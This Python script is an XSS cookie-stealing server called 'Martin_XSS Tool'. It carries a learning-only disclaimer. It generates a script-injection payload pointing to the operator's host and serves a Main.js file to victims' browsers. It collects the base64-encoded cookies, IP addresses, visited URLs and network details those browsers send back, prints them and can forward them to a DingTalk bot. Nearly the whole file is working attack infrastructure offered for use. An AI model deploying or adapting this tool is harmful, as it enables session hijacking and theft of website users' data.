#!/usr/bin/python3
# @Martin
import base64
import json
import socket
import sys
import argparse
import datetime
import textwrap
import threading
import requests
import re
Version = "V3.2"
Title='''Github==>https://github.com/MartinxMax\n<免责声明>:仅供学习实验使用,请勿用于非法行为,否则自行承担法律责任\n<Disclaimer>: For learning and experiment only, please do not use it for illegal acts, otherwise you will bear legal responsibility'''
Ding_talk_headers = {'Content-Type': 'application/json;charset=utf-8'}
Logo='''
.88b  d88.  .d8b.  d8888b. d888888b d888888b d8b   db        db    db .d8888. .d8888. db    db d8888b.    .d888b. 
88'YbdP`88 d8' `8b 88  `8D `~~88~~'   `88'   888o  88        `8b  d8' 88'  YP 88'  YP 88    88 VP  `8D    VP  `8D 
88  88  88 88ooo88 88oobY'    88       88    88V8o 88         `8bd8'  `8bo.   `8bo.   Y8    8P   oooY'       odD' 
88  88  88 88~~~88 88`8b      88       88    88 V8o88 C8888D  .dPYb.    `Y8b.   `Y8b. `8b  d8'   ~~~b.     .88'   
88  88  88 88   88 88 `88.    88      .88.   88  V888        .8P  Y8. db   8D db   8D  `8bd8'  db   8D db j88.    
YP  YP  YP YP   YP 88   YD    YP    Y888888P VP   V8P        YP    YP `8888Y' `8888Y'    YP    Y8888P' VP 888888D 
'''
def Get_LoackHost():
    return socket.gethostbyname(socket.gethostname())
class TCPINFO():
    def __init__(self, args):
        self.args = args
        self.LPORT = args.LPORT
        self.LHOST = args.LHOST
        self.RPORTS = args.RPORTS
        self.RHOSTS = args.RHOSTS
        self.DingTalk_Config = args.DingTalk_Config_File
        self.DingTalk_Token = args.DingTalk_Token
        self.DingTalk_Key = args.DingTalk_Key
        self.Transmission_mode=args.Transmission_mode
    def run(self):
        if not self.DingTalk_Test():
            sys.exit(0)
        PAYLOAD = f"<script src=\"{self.Transmission_mode and self.RHOSTS or 'http://'+Get_LoackHost()}:{self.Transmission_mode and self.RPORTS or str(self.LPORT)}/Main.js\"></script>"
        self.Interface_JS(self.Transmission_mode and self.RHOSTS or "http://"+Get_LoackHost(),self.Transmission_mode and self.RPORTS or str(self.LPORT))
        print('-'*100,"\n[+]Payload=>",PAYLOAD,"\n",'-'*100)
        self.TCP_Listen()

    def TCP_Listen(self):
        TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP.bind(("", self.LPORT))
        TCP.listen(50)
        while True:
            SOCK,_= TCP.accept()
            threading.Thread(
                target=self.Client, args=(SOCK,)
            ).start()
    def Interface_JS(self,IP,PORT):
        with open('./Main.js','r')as f:
            Note = re.sub(',"(.*?)",true\);//Tag', f',"{IP}:{PORT}",true);//Tag', f.read())
        with open('./Main.js','w')as f:
            f.write(Note)
    def Send_JS(self,SOCK):
        with open('./Main.js','rb')as f:
            Byte_Code=f.read()
        Head = "HTTP/1.1 200 OK\r\n"
        Head += f"content-length:{len(Byte_Code)}\r\n\r\n"
        SOCK.send(Head.encode())
        SOCK.send(Byte_Code)
    def Client(self,SOCK):
        DATA = SOCK.recv(1024).decode('utf-8')

        if "Main.js" in DATA:
            self.Send_JS(SOCK)
        elif "{" in DATA:
            self.Get_User_Information_And_Display(DATA)
        SOCK.close()

    def Get_User_Information_And_Display(self,DATA):
        User_INFO = json.loads(re.search(r'{(.*?)}', DATA).group())
        for Key,Value in User_INFO.items():
            User_INFO[Key]=self.Decrypt(Value)
        Dis_Info =f'''
------------------------------------------------------------------------------
|$Time>{User_INFO['Time']}\t//Visit_URL:{User_INFO['Visit_URL']}\t#Host_Type:{User_INFO['Host_Type']}
|IP:{User_INFO['IP']}\tCookie:{User_INFO['Cookies']}\tNetWork:{User_INFO['NetWork']}   
-----------------------------------------------------------------------------       
'''
        print(Dis_Info)
        if self.DingTalk_Token and self.DingTalk_Key:
            self.DingTalk_Send(Dis_Info)
    def Decrypt(self,str):
        try:
            str=base64.b64decode(str).decode("utf-8")
        except:
            pass
        return str
    def Get_DingTalk_Config_File(self):
        try:
            with open('DingTalk.conf','r')as f:
                Note = json.loads(f.read())
        except:
            return False
        else:
            if Note['Token'] and Note['Key_Word']:
                self.DingTalk_Token=Note['Token']
                self.DingTalk_Key=Note['Key_Word']
                return True
            else:
                return False

        return True
    def DingTalk_Test(self):
        if self.DingTalk_Config:
            if self.Get_DingTalk_Config_File():
                print("[+]Load DingTalk.conf Success !")
                if self.DingTalk_Send("Robot Online"):
                    print("[+]Push module is normal")
                    return True
                else:
                    print("[!]Push module is abnormal")
                    return False
            else:
                print("[!]Your DingTalk.conf file parameters are incorrect")
                return False
        else:
            if self.DingTalk_Token and self.DingTalk_Key:
                if self.DingTalk_Send("Robot Online"):
                    print("[+]Push module is normal")
                    return True
                else:
                    print("[!]Push module is abnormal")
                    return False
            elif self.DingTalk_Token or self.DingTalk_Key:
                print("[Warning!]You must fill in the parameters -dt and -dk")
                return False
            else:
                return True
    def DingTalk_Send(self,Push_Message):

        Message = {
            "text": {
                "content": f"=={self.DingTalk_Key}==\n{Push_Message}"
            },
            "msgtype": "text"
        }
        try:
            DATA = requests.post(f"https://oapi.dingtalk.com/robot/send?access_token={self.DingTalk_Token}",
                         headers=Ding_talk_headers
                         , json=Message)
        except:
            pass
        finally:
            if DATA.status_code == 200:
                print("[+]Message Push DingTalk ------[Success]")
                return True
            else:
                print("[!]Message Push DingTalk ------[Fail]")
                return False

def main():
    print(Logo,"\n",Title)
    parser = argparse.ArgumentParser(
        description=f'Martin_XSS Tool ---Martin {Version}',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Usage:
           python3 %s # You can enable the default intranet port 8888 to listen without adding any parameters
           python3 %s -lp 1234  # You can add the - p parameter to specify the port
           python3 %s -lp 1234 -dt xxxxx... -dk xxx # You can push the results
           python3 %s -lp 1234 -dcf # You can use the parameter options directly after filling in the configuration file
           python3 %s -t -lp 1234 -rh xxx.xxx.xxx.xxx -rp xxxx # You can join the IP and port penetrated by your intranet
           python3 %s -t -lp 1234 -rh xxx.xxx.xxx.xxx -rp xxxx -dt xxxxx... -dk xxx # You can push the results
           python3 %s -t -lp 1234 -rh xxx.xxx.xxx.xxx -rp xxxx -dcf # You can use the parameter options directly after filling in the configuration file
    
            '''% (sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0])))
    parser.add_argument('-lp', '--LPORT', type=int, default=8888, help='Listen port')
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='# Currently in the development stage, you don\'t need to carry this parameter')
    parser.add_argument('-t', '--Transmission_mode', action='store_true', help='Intranet penetration mode')
    parser.add_argument('-dcf', '--DingTalk_Config_File', action='store_true', help='DingTalk_Config_File')
    parser.add_argument('-dt','--DingTalk_Token', default=None, help='DingTalk_Token')
    parser.add_argument('-dk','--DingTalk_Key', default=None, help='DingTalk_Key')
    parser.add_argument('-rp', '--RPORTS', type=int, default=8888, help='Remote Port')
    parser.add_argument('-rh', '--RHOSTS', default=Get_LoackHost(), help='Remote IP')
    args = parser.parse_args()
    TCPINFO(args).run()
if __name__ == '__main__':
    main()